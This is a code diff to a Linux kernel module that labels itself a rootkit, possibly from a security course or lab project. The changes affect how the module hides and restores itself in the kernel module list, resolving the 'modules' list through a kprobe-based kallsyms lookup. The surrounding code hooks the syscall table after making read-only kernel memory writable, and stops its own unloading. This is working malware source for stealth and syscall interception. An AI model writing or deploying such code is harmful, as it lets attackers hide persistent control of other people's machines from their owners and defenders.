@@ -34,12 +34,12 @@ MODULE_VERSION("0.1");
 
 // The rootkit module should be visible by default.
 static bool module_hidden = false;
-static struct list_head *prev_module_entry = NULL;
 
 /* Kprobe */
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
+struct list_head *modules = NULL;
 unsigned long (*__kallsyms_lookup_name)(const char *);
 static unsigned long *__sys_call_table = NULL;
 static sys_call_t orig_sys_call[NR_syscalls];
@@ -61,7 +61,6 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
 
 static void toggle_module_visibility(void) {
     if (!module_hidden) {
-        prev_module_entry = THIS_MODULE->list.prev;
         try_module_get(THIS_MODULE); // Prevent unloading
         // Hide module: remove from list
         list_del(&THIS_MODULE->list);
@@ -69,8 +68,7 @@ static void toggle_module_visibility(void) {
         
         printk(KERN_INFO "Module hidden\n");
     } else {
-        if (prev_module_entry)
-            list_add(&THIS_MODULE->list, prev_module_entry);
+        list_add_tail(&THIS_MODULE->list, modules);
         module_hidden = false;
         module_put(THIS_MODULE); // Balance reference count
 
@@ -111,6 +109,7 @@ static int get_kallsyms_lookup_name(void) {
 }
 
 void resolve_symbol_addr(void) {
+    modules = (struct list_head *)__kallsyms_lookup_name("modules");
     __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
     update_mapping_prot = (void *)__kallsyms_lookup_name("update_mapping_prot");
     start_rodata = (unsigned long)__kallsyms_lookup_name("__start_rodata");
@@ -129,7 +128,6 @@ static inline void __mark_rodata_ro(void) {
                         PAGE_KERNEL_RO);
 }
 
-// add
 static asmlinkage long hooked_syscall(const struct pt_regs *regs) {
     struct filter *cur;
     struct task_struct *current_t;
@@ -145,7 +143,6 @@ static asmlinkage long hooked_syscall(const struct pt_regs *regs) {
     return orig_sys_call[syscall_nr](regs);
 }
 
-// modified
 static int set_syscall_hook(void) {
     __mark_rodata_wr();
 
